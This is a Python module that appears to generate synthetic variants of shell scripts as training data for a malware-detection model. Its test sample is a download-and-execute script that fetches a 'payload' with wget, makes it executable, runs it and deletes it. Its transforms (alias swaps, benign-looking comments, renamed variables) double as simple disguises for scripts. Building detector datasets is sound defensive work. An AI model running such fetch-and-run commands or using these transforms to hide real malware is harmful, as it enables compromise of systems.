"""
Data Augmentation Module for Shell Script Malware Detection
Generates synthetic variations of shell scripts to expand the training dataset
"""

import re
import random
import copy
from typing import List, Tuple


class ShellScriptAugmenter:
    """Augment shell scripts with realistic variations"""
    
    # Alternative command patterns
    COMMAND_ALIASES = {
        'wget': ['curl -O', 'curl -sLo'],
        'curl': ['wget -q', 'wget'],
        'rm -rf': ['rm -f', 'rm --force -r'],
        'chmod +x': ['chmod 755', 'chmod 777', 'chmod a+x'],
        'echo': ['printf', 'printf "%s\\n"'],
    }
    
    # Comment variations
    COMMENTS = [
        "# System maintenance script",
        "# Automated setup",
        "# Configuration helper",
        "# DO NOT EDIT - auto generated",
        "#!/bin/bash",
    ]
    
    # Variable name pools
    VAR_NAMES = [
        ('url', 'target', 'endpoint', 'server', 'host'),
        ('file', 'payload', 'bin', 'exec', 'app'),
        ('dir', 'path', 'folder', 'dest', 'location'),
        ('tmp', 'temp', 'cache', 'work', 'scratch'),
    ]
    
    def __init__(self, seed: int = None):
        if seed is not None:
            random.seed(seed)
    
    def augment(self, script: str, num_variations: int = 3) -> List[str]:
        """
        Generate multiple variations of a script
        
        Args:
            script: Original shell script content
            num_variations: Number of variations to generate
            
        Returns:
            List of augmented script variations
        """
        variations = []
        
        for i in range(num_variations):
            augmented = script
            
            # Apply random augmentations
            augmentations = [
                self._add_whitespace_variation,
                self._swap_command_aliases,
                self._add_comments,
                self._vary_variable_names,
                self._add_noop_commands,
                self._reorder_independent_lines,
            ]
            
            # Apply 2-4 random augmentations
            selected = random.sample(augmentations, min(len(augmentations), random.randint(2, 4)))
            
            for aug_func in selected:
                try:
                    augmented = aug_func(augmented)
                except Exception:
                    pass  # Skip failed augmentations
            
            if augmented != script and augmented not in variations:
                variations.append(augmented)
        
        return variations
    
    def _add_whitespace_variation(self, script: str) -> str:
        """Add/remove whitespace variations"""
        lines = script.split('\n')
        result = []
        
        for line in lines:
            if random.random() > 0.7:
                # Add blank line before
                result.append('')
            result.append(line)
            if random.random() > 0.8:
                # Add blank line after
                result.append('')
        
        return '\n'.join(result)
    
    def _swap_command_aliases(self, script: str) -> str:
        """Swap commands with their aliases"""
        result = script
        
        for cmd, aliases in self.COMMAND_ALIASES.items():
            if cmd in result and random.random() > 0.5:
                replacement = random.choice(aliases)
                # Only replace first occurrence to avoid breaking syntax
                result = result.replace(cmd, replacement, 1)
        
        return result
    
    def _add_comments(self, script: str) -> str:
        """Add random comments to script"""
        if not script.startswith('#'):
            header = random.choice(self.COMMENTS)
            return f"{header}\n{script}"
        
        lines = script.split('\n')
        result = [lines[0]]  # Keep shebang
        
        for line in lines[1:]:
            if random.random() > 0.85 and line.strip() and not line.strip().startswith('#'):
                result.append(f"# Step: {random.choice(['process', 'setup', 'execute', 'configure'])}")
            result.append(line)
        
        return '\n'.join(result)
    
    def _vary_variable_names(self, script: str) -> str:
        """Change variable names to variations"""
        result = script
        
        # Find existing variable assignments
        var_pattern = r'\b([a-zA-Z_][a-zA-Z0-9_]*)='
        matches = re.findall(var_pattern, script)
        
        for var_name in matches:
            if len(var_name) < 3 or var_name.isupper():
                continue  # Skip single letters and environment vars
            
            # Find a suitable replacement
            for name_group in self.VAR_NAMES:
                if var_name.lower() in name_group:
                    new_name = random.choice([n for n in name_group if n != var_name.lower()])
                    result = result.replace(var_name, new_name)
                    break
        
        return result
    
    def _add_noop_commands(self, script: str) -> str:
        """Add harmless no-op commands"""
        noops = [
            'true',
            ': # noop',
            'sleep 0',
        ]
        
        lines = script.split('\n')
        result = []
        
        for line in lines:
            result.append(line)
            if random.random() > 0.9 and line.strip() and not line.strip().startswith('#'):
                result.append(random.choice(noops))
        
        return '\n'.join(result)
    
    def _reorder_independent_lines(self, script: str) -> str:
        """Reorder lines that don't have dependencies"""
        lines = script.split('\n')
        
        if len(lines) < 4:
            return script
        
        # Keep first 2 lines (shebang, variable declarations)
        # and last line intact
        header = lines[:2]
        footer = lines[-1:]
        middle = lines[2:-1] if len(lines) > 3 else []
        
        # Only shuffle if we have enough middle lines
        if len(middle) >= 2 and random.random() > 0.7:
            # Shuffle a subset of middle lines
            shuffle_start = random.randint(0, len(middle) - 2)
            shuffle_end = min(shuffle_start + 3, len(middle))
            subset = middle[shuffle_start:shuffle_end]
            random.shuffle(subset)
            middle[shuffle_start:shuffle_end] = subset
        
        return '\n'.join(header + middle + footer)


def augment_dataset(
    scripts: List[str],
    labels: List[int],
    augmentation_factor: int = 3,
    seed: int = 42
) -> Tuple[List[str], List[int]]:
    """
    Augment an entire dataset of scripts
    
    Args:
        scripts: List of original scripts
        labels: List of corresponding labels
        augmentation_factor: Number of variations per script
        seed: Random seed for reproducibility
        
    Returns:
        Tuple of (augmented_scripts, augmented_labels)
    """
    augmenter = ShellScriptAugmenter(seed=seed)
    
    aug_scripts = list(scripts)  # Keep originals
    aug_labels = list(labels)
    
    for script, label in zip(scripts, labels):
        variations = augmenter.augment(script, num_variations=augmentation_factor)
        aug_scripts.extend(variations)
        aug_labels.extend([label] * len(variations))
    
    print(f"[Augmentation] Original: {len(scripts)} -> Augmented: {len(aug_scripts)} samples")
    
    return aug_scripts, aug_labels


if __name__ == '__main__':
    # Test augmentation
    test_script = """#!/bin/bash
wget http://example.com/payload -O /tmp/file
chmod +x /tmp/file
./tmp/file
rm -rf /tmp/file
"""
    
    augmenter = ShellScriptAugmenter(seed=42)
    variations = augmenter.augment(test_script, num_variations=5)
    
    print("Original:")
    print(test_script)
    print("\n" + "="*50 + "\n")
    
    for i, var in enumerate(variations, 1):
        print(f"Variation {i}:")
        print(var)
        print("-"*30)
